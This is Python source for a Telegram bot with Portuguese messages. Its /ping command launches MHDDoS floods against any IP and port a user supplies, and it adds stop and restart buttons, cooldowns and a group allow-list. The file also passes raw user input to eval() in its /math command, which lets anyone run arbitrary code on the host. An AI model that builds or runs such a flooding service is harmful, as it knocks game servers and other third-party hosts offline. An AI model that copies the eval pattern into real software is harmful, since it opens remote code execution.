import telebot
import json
import os
import time
import random
import operator
import threading
import subprocess
from threading import Lock, Thread, Timer
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "TU_BOT_TOKEN"
ADMIN_ID = TU_ADMIN_ID
GROUP_LINK = "LINK_DE_TU_GRUPO"
START_PY_PATH = "/workspaces/MHDDoS/start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}
spam_cooldowns = {}

groups_file = "groups.json"
users_file = "users.json"
free_time_file = "free_time.json"

if not os.path.exists(groups_file):
    with open(groups_file, "w") as f:
        json.dump({"groups": []}, f)

if not os.path.exists(users_file):
    with open(users_file, "w") as f:
        json.dump({"users": []}, f)

if not os.path.exists(free_time_file):
    with open(free_time_file, "w") as f:
        json.dump({}, f)

def load_json(file_path):
    with open(file_path, "r") as f:
        return json.load(f)

def save_json(file_path, data):
    with open(file_path, "w") as f:
        json.dump(data, f)

def load_groups():
    return load_json(groups_file)["groups"]

def save_groups(groups):
    save_json(groups_file, {"groups": groups})

def load_users():
    return load_json(users_file)["users"]

def save_users(users):
    save_json(users_file, {"users": users})

def load_free_time():
    return load_json(free_time_file)

def save_free_time(data):
    save_json(free_time_file, data)

def add_user(user_id):
    users = load_users()
    if user_id not in users:
        users.append(user_id)
        save_users(users)

def is_allowed(message):
    groups = load_groups()
    user_id = message.from_user.id

    if message.text.startswith("/register"):
        return True

    users = load_users()
    if user_id not in users:
        bot.reply_to(message, "❌ *Você deve se registrar antes de usar este bot.*\nUse o comando /register para se registrar.", parse_mode="Markdown")
        return False

    if message.chat.id in groups or (message.chat.type == "private" and user_id == ADMIN_ID):
        return True

    bot.reply_to(message, f"❌ *Este bot só funciona em grupos autorizados!*\n🔗 Junte-se ao nosso grupo de *Free Fire* aqui: {GROUP_LINK}")
    return False

def is_admin(message):
    return message.from_user.id == ADMIN_ID or message.from_user.id in [admin.user.id for admin in bot.get_chat_administrators(message.chat.id)]

def generate_math_question(level):
    ops = {
        'easy': [(operator.add, '+'), (operator.sub, '-')],
        'normal': [(operator.add, '+'), (operator.sub, '-'), (operator.mul, '*')],
        'hard': [(operator.add, '+'), (operator.sub, '-'), (operator.mul, '*'), (operator.truediv, '/')]
    }

    op, symbol = random.choice(ops[level])

    if level == 'easy':
        num1, num2 = random.randint(1, 10), random.randint(1, 10)
    elif level == 'normal':
        num1, num2 = random.randint(1, 50), random.randint(1, 50)
    else:  # hard
        num1, num2 = random.randint(1, 100), random.randint(1, 100)

    if symbol == '/':
        num2 = random.choice([i for i in range(1, 101) if num1 % i == 0])

    question = f"Quanto é {num1} {symbol} {num2}?"
    answer = str(op(num1, num2))

    return question, answer

def timeout_handler(message, answer, user_id, level):
    time.sleep(20)
    bot.send_message(message.chat.id, "❌ *Tempo esgotado. Tente novamente!*", parse_mode="Markdown")

@bot.message_handler(commands=["trivia"])
def handle_trivia(message):
    try:
        level = message.text.split()[1].lower()
        if level not in ['easy', 'normal', 'hard']:
            raise ValueError("Nível inválido")

        question, answer = generate_math_question(level)
        user_id = message.from_user.id

        bot.send_message(message.chat.id, f"🎮 *Pergunta de {level}:* {question}")

        timer = threading.Thread(target=timeout_handler, args=(message, answer, user_id, level))
        timer.start()

        bot.register_next_step_handler(message, check_answer, answer, user_id, level, timer)

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ *Erro ao iniciar a trivia: {str(e)}*", parse_mode="Markdown")

def check_answer(message, correct_answer, user_id, level, timer):
    if timer.is_alive():
        timer.join()

    if message.text.strip() == correct_answer:
        bot.send_message(message.chat.id, "✅ *Resposta correta!*")

        if level == "easy":
            free_duration = 1
        elif level == "normal":
            free_duration = 3 
        elif level == "hard":
            free_duration = 24

        free_time = load_free_time()
        free_time[user_id] = time.time() + free_duration * 3600
        save_free_time(free_time)
        bot.send_message(message.chat.id, f"🎉 *Parabéns! Você ganhou {free_duration} hora(s) de uso grátis do bot.*", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "❌ *Resposta incorreta. Tente novamente!*", parse_mode="Markdown")

@bot.message_handler(commands=["freetime"])
def handle_freetime(message):
    user_id = message.from_user.id
    free_time = load_free_time()
    if user_id in free_time:
        remaining_time = free_time[user_id] - time.time()
        if remaining_time > 0:
            hours, remainder = divmod(remaining_time, 3600)
            minutes = remainder // 60
            bot.send_message(message.chat.id, f"🕒 *Tempo grátis restante:* {int(hours)} horas e {int(minutes)} minutos.", parse_mode="Markdown")
        else:
            del free_time[user_id]
            save_free_time(free_time)
            bot.send_message(message.chat.id, "🕒 *Seu tempo grátis expirou.*", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "🕒 *Você não tem tempo grátis disponível.*", parse_mode="Markdown")

@bot.message_handler(commands=["register"])
def handle_register(message):
    user_id = message.from_user.id
    add_user(user_id)
    bot.reply_to(message, f"✅ *Registrado com sucesso!*\nSeu ID de usuário é: `{user_id}`", parse_mode="Markdown")

@bot.message_handler(commands=["id"])
def handle_id(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if message.chat.type == "private":
        bot.reply_to(message, f"✅ *Seu ID de usuário é:* `{user_id}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"✅ *Seu ID de usuário é:* `{user_id}`\n*O ID do grupo é:* `{chat_id}`", parse_mode="Markdown")

@bot.message_handler(commands=["kick"])
def handle_kick(message):
    if not is_admin(message):
        bot.reply_to(message, "❌ *Apenas administradores podem usar este comando.*", parse_mode="Markdown")
        return

    try:
        user_id = int(message.text.split()[1])
        bot.kick_chat_member(message.chat.id, user_id)
        bot.reply_to(message, f"✅ *Usuário {user_id} expulso do grupo.*", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ *Erro ao expulsar o usuário: {str(e)}*", parse_mode="Markdown")

@bot.message_handler(commands=["ban"])
def handle_ban(message):
    if not is_admin(message):
        bot.reply_to(message, "❌ *Apenas administradores podem usar este comando.*", parse_mode="Markdown")
        return

    try:
        user_id = int(message.text.split()[1])
        bot.ban_chat_member(message.chat.id, user_id)
        bot.reply_to(message, f"✅ *Usuário {user_id} banido do grupo.*", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ *Erro ao banir o usuário: {str(e)}*", parse_mode="Markdown")

@bot.message_handler(commands=["mute"])
def handle_mute(message):
    if not is_admin(message):
        bot.reply_to(message, "❌ *Apenas administradores podem usar este comando.*", parse_mode="Markdown")
        return

    try:
        args = message.text.split()
        user_id = int(args[1])
        mute_time = int(args[2])
        bot.restrict_chat_member(message.chat.id, user_id, until_date=time.time() + mute_time * 60)
        bot.reply_to(message, f"✅ *Usuário {user_id} silenciado por {mute_time} minutos.*", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ *Erro ao silenciar o usuário: {str(e)}*", parse_mode="Markdown")

@bot.message_handler(commands=["math"])
def handle_math(message):
    try:
        expression = message.text.replace("/math ", "")
        result = eval(expression)
        bot.reply_to(message, f"✅ *Resultado:* `{result}`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ *Erro ao avaliar a expressão: {str(e)}*", parse_mode="Markdown")

@bot.message_handler(commands=["ping"])
def handle_ping(message):
    if not is_allowed(message):
        return

    telegram_id = message.from_user.id

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
        bot.reply_to(message, "❌ *Aguarde 20 segundos* antes de tentar novamente.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ *Formato inválido!* 🚫\n\n"
                "📌 *Uso correto:*\n"
                "`/ping <TIPO> <IP/HOST:PORTA> <THREADS> <MS>`\n\n"
                "💡 *Exemplo de uso:*\n"
                "`/ping UDP 143.92.125.230:10013 1 480`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = int(args[3])
    duration = int(args[4])

    if threads > 3:
        bot.reply_to(message, "❌ *O número máximo de threads permitido é 3.*")
        return

    if duration > 600:
        bot.reply_to(message, "❌ *A duração máxima permitida é de 600 segundos (10 minutos).*")
        return

    command = ["python", START_PY_PATH, attack_type, ip_port, str(threads), str(duration)]

    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[telegram_id] = process
        cooldowns[telegram_id] = time.time()
        cooldowns[f"last_command_{telegram_id}"] = message.text

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ *Parar Ataque* ⛔", callback_data=f"stop_{telegram_id}"))

        bot.reply_to(
            message,
            (
                "*🔥 Ataque Iniciado! 🔥*\n\n"
                f"📍 *IP:* {ip_port}\n"
                f"⚙️ *Tipo:* {attack_type}\n"
                f"🧵 *Threads:* {threads}\n"
                f"⏳ *Duração:* {duration} segundos\n\n"
                "*Azure Corporation Users* 🎮"
            ),
            reply_markup=markup,
            parse_mode="Markdown",
        )
    except Exception as e:
        bot.reply_to(message, f"❌ *Erro ao iniciar o ataque:* {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        try:
            bot.answer_callback_query(
                call.id, "❌ *Apenas o usuário que iniciou o ataque pode pará-lo.*"
            )
        except Exception as e:
            print(f"Erro ao responder à consulta de callback: {str(e)}")
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        try:
            bot.answer_callback_query(call.id, "✅ *Ataque parado com sucesso.*")
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 Realizar ataque novamente", callback_data=f"restart_attack_{telegram_id}"))

            bot.edit_message_text(
                "*[⛔] *ATAQUE PARADO* [⛔]*\n\n"
                "Quer realizar o ataque novamente? Você tem **20 segundos** para decidir.",
                chat_id=call.message.chat.id,
                message_id=call.message.id,
                reply_markup=markup,
                parse_mode="Markdown",
            )

            Timer(20, delete_message, args=(call.message.chat.id, call.message.message_id)).start()
        except Exception as e:
            print(f"Erro ao responder à consulta de callback ou editar a mensagem: {str(e)}")
    else:
        try:
            bot.answer_callback_query(call.id, "❌ *Não há ataque ativo para parar.*")
        except Exception as e:
            print(f"Erro ao responder à consulta de callback: {str(e)}")

def delete_message(chat_id, message_id):
    """Exclui a mensagem após 20 segundos."""
    try:
        bot.delete_message(chat_id, message_id)
    except Exception as e:
        print(f"Erro ao excluir a mensagem: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("restart_attack_"))
def handle_restart_attack(call):
    telegram_id = int(call.data.split("_")[2])

    if call.from_user.id != telegram_id:
        try:
            bot.answer_callback_query(
                call.id, "❌ *Apenas o usuário que iniciou o ataque pode repeti-lo.*"
            )
        except Exception as e:
            print(f"Erro ao responder à consulta de callback: {str(e)}")
        return

    if telegram_id in spam_cooldowns and time.time() - spam_cooldowns[telegram_id] < 60:
        bot.answer_callback_query(
            call.id, "❌ *Você fez muitas solicitações. Aguarde 1 minuto antes de tentar novamente.*"
        )
        return

    if telegram_id not in active_attacks:
        bot.answer_callback_query(
            call.id, "❌ *O tempo para reiniciar o ataque expirou.*"
        )
        return

    last_command = cooldowns.get(f"last_command_{telegram_id}")
    if not last_command:
        try:
            bot.answer_callback_query(call.id, "❌ *Não há um ataque anterior para repetir.*")
        except Exception as e:
            print(f"Erro ao responder à consulta de callback: {str(e)}")
        return

    try:
        args = last_command.split()
        attack_type = args[1]
        ip_port = args[2]
        threads = int(args[3])
        duration = int(args[4])

        if threads > 3:
            bot.answer_callback_query(call.id, "❌ *O número máximo de threads permitido é 3.*")
            return

        if duration > 600:
            bot.answer_callback_query(call.id, "❌ *A duração máxima permitida é de 600 segundos (10 minutos).*")
            return

        command = ["python", START_PY_PATH, attack_type, ip_port, str(threads), str(duration)]

        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[telegram_id] = process
        cooldowns[telegram_id] = time.time()

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ *Parar Ataque* ⛔", callback_data=f"stop_{telegram_id}"))

        bot.edit_message_text(
            "*🔥 Ataque Reiniciado! 🔥*\n\n"
            f"📍 *IP:* {ip_port}\n"
            f"⚙️ *Tipo:* {attack_type}\n"
            f"🧵 *Threads:* {threads}\n"
            f"⏳ *Duração:* {duration} segundos\n\n"
            "*Azure Corporation Users* 🎮",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            reply_markup=markup,
            parse_mode="Markdown",
        )
        bot.answer_callback_query(call.id, "✅ *Ataque reiniciado com sucesso.*")
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ *Erro ao reiniciar o ataque:* {str(e)}")

    if telegram_id in spam_cooldowns:
        spam_cooldowns[telegram_id] = time.time()
    else:
        spam_cooldowns[telegram_id] = time.time()

@bot.message_handler(commands=["addgroup"])
def handle_addgroup(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Apenas o admin pode adicionar grupos.*")
        return

    try:
        group_id = int(message.text.split()[1])
        groups = load_groups()

        if group_id in groups:
            bot.reply_to(message, "❌ *Este grupo já está na lista.*")
            return

        groups.append(group_id)
        save_groups(groups)

        bot.reply_to(message, f"✅ *Grupo {group_id} adicionado com sucesso.*")
    except IndexError:
        bot.reply_to(message, "❌ *Por favor, forneça um ID de grupo válido.*")
    except ValueError:
        bot.reply_to(message, "❌ *O ID do grupo deve ser um número válido.*")

@bot.message_handler(commands=["removegroup"])
def handle_removegroup(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Apenas o admin pode remover o bot dos grupos.*")
        return

    if message.chat.type != "private":
        bot.reply_to(message, "❌ *Este comando só pode ser usado em privado.*")
        return

    try:
        group_id = int(message.text.split()[1])
        groups = load_groups()

        if group_id not in groups:
            bot.reply_to(message, "❌ *Este grupo não está na lista.*")
            return

        groups.remove(group_id)
        save_groups(groups)

        bot.leave_chat(group_id)

        bot.reply_to(message, f"✅ *Bot removido com sucesso do grupo {group_id}.*")
    except IndexError:
        bot.reply_to(message, "❌ *Por favor, forneça um ID de grupo válido.*")
    except ValueError:
        bot.reply_to(message, "❌ *O ID do grupo deve ser um número válido.*")

@bot.message_handler(commands=["listgroups"])
def handle_listgroups(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Apenas o admin pode ver a lista de grupos.*")
        return

    groups = load_groups()
    if not groups:
        bot.reply_to(message, "❌ *Não há grupos autorizados.*")
        return

    groups_list = "\n".join([f"📍 *Grupo ID:* {group_id}" for group_id in groups])
    bot.reply_to(
        message,
        f"📋 *Grupos autorizados:*\n{groups_list}",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["help"])
def handle_help(message):
    if not is_allowed(message):
        return

    bot.send_message(
        message.chat.id,
        (
            "🔧 *Como usar este bot?* 🤖\n\n"
            "Este bot foi projetado para ajudá-lo a executar testes de ataque com fins educativos no Free Fire.\n\n"
            "*Comandos disponíveis:*\n"
            "1. `/start`: Inicia o bot e fornece uma breve introdução.\n"
            "2. `/ping <TIPO> <IP/HOST:PORTA> <THREADS> <MS>`: Inicia um ataque de ping.\n"
            "3. `/addgroup <ID do grupo>`: Adiciona um grupo à lista de grupos permitidos (apenas admin).\n"
            "4. `/removegroup <ID do grupo>`: Remove um grupo da lista de grupos permitidos (apenas admin).\n"
            "5. `/help`: Mostra esta ajuda.\n"
            "6. `/timeactive`: Mostra o tempo ativo do bot e o tempo restante antes de ser fechado.\n"
            "7. `/broadcast <mensagem>`: Envia uma mensagem para todos os usuários registrados (apenas admin).\n"
            "8. `/broadcastgroup <mensagem>`: Envia uma mensagem para todos os grupos autorizados (apenas admin).\n"
            "9. `/trivia <nível>`: Inicia um jogo de trivia com perguntas de matemática.\n"
            "10. `/math <expressão>`: Avalia uma expressão matemática.\n"
            "11. `/kick <usuário>`: Expulsa um usuário do grupo (apenas admin).\n"
            "12. `/ban <usuário>`: Bane um usuário do grupo (apenas admin).\n"
            "13. `/mute <usuário> <tempo>`: Silencia um usuário por um período de tempo (apenas admin).\n"
            "14. `/listgroups`: Mostra grupos autorizados.\n\n"
            "Jogue com responsabilidade e divirta-se! 🎮"
        ),
        parse_mode="Markdown",
    )

@bot.message_handler(commands=["timeactive"])
def handle_timeactive(message):
    if not is_allowed(message):
        return

    elapsed_time = time.time() - start_time
    remaining_time = max(0, 140 * 60 - elapsed_time)

    elapsed_minutes = int(elapsed_time // 60)
    elapsed_seconds = int(elapsed_time % 60)

    remaining_minutes = int(remaining_time // 60)
    remaining_seconds = int(remaining_time % 60)

    bot.reply_to(
        message,
        (
            f"🕒 *Tempo ativo do bot:*\n"
            f"✅ *Tempo decorrido:* {elapsed_minutes}m {elapsed_seconds}s\n"
            f"⚠️ *Tempo restante:* {remaining_minutes}m {remaining_seconds}s\n\n"
            "🚀 *Lembre-se de que o bot fecha automaticamente após 140 minutos.*"
        ),
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["broadcast"])
def handle_broadcast(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Apenas o admin pode usar este comando.*")
        return

    text = message.text.replace("/broadcast", "").strip()
    if not text:
        bot.reply_to(message, "❌ *Você deve escrever uma mensagem após /broadcast.*")
        return

    users = load_users()
    success_count, fail_count = 0, 0

    for user_id in users:
        try:
            bot.send_message(user_id, f"📢 {text}", parse_mode="Markdown")
            success_count += 1
        except Exception as e:
            fail_count += 1
            print(f"Não foi possível enviar mensagem para {user_id}: {str(e)}")

    bot.reply_to(message, f"✅ Mensagem enviada para {success_count} usuários. ❌ Falhou em {fail_count}.")

@bot.message_handler(commands=["broadcastgroup"])
def handle_broadcastgroup(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Apenas o admin pode usar este comando.*")
        return

    text = message.text.replace("/broadcastgroup", "").strip()
    if not text:
        bot.reply_to(message, "❌ *Você deve escrever uma mensagem após /broadcastgroup.*")
        return

    groups = load_groups()
    success_count, fail_count = 0, 0

    for group_id in groups:
        try:
            bot.send_message(group_id, f"📢 *Mensagem do admin:* {text}", parse_mode="Markdown")
            success_count += 1
        except Exception as e:
            fail_count += 1
            print(f"Não foi possível enviar mensagem para o grupo {group_id}: {str(e)}")

    bot.reply_to(message, f"✅ Mensagem enviada para {success_count} grupos. ❌ Falhou em {fail_count}.")

def notify_groups_bot_started():
    """Notifica os grupos que o bot foi iniciado."""
    groups = load_groups()
    for group_id in groups:
        try:
            bot.send_message(
                group_id,
                "✅ *O bot foi reativado!*\n\n"
                "Agora você pode continuar usando os comandos disponíveis.\n\n"
                "Obrigado pela paciência! 💪",
                parse_mode="Markdown",
            )
        except Exception as e:
            print(f"Não foi possível enviar mensagem para o grupo {group_id}: {str(e)}")

def check_shutdown_time():
    """Verifica o tempo restante e notifica os grupos quando faltarem 5 minutos."""
    start_time = time.time()
    while True:
        elapsed_time = time.time() - start_time
        remaining_time = max(0, 140 * 60 - elapsed_time)

        if remaining_time <= 300:
            groups = load_groups()
            for group_id in groups:
                try:
                    bot.send_message(
                        group_id,
                        "⚠️ *Aviso Importante:*\n\n"
                        "O bot será desligado em **5 minutos** devido a limites de tempo.\n"
                        "Um administrador o reativará em breve. Por favor, seja paciente.\n\n"
                        "Obrigado pela compreensão! 🙏",
                        parse_mode="Markdown",
                    )
                except Exception as e:
                    print(f"Não foi possível enviar mensagem para o grupo {group_id}: {str(e)}")

            time.sleep(300)
            break

        time.sleep(60)

if __name__ == "__main__":
    notify_groups_bot_started()

    shutdown_thread = threading.Thread(target=check_shutdown_time)
    shutdown_thread.daemon = True
    shutdown_thread.start()

    bot.infinity_polling()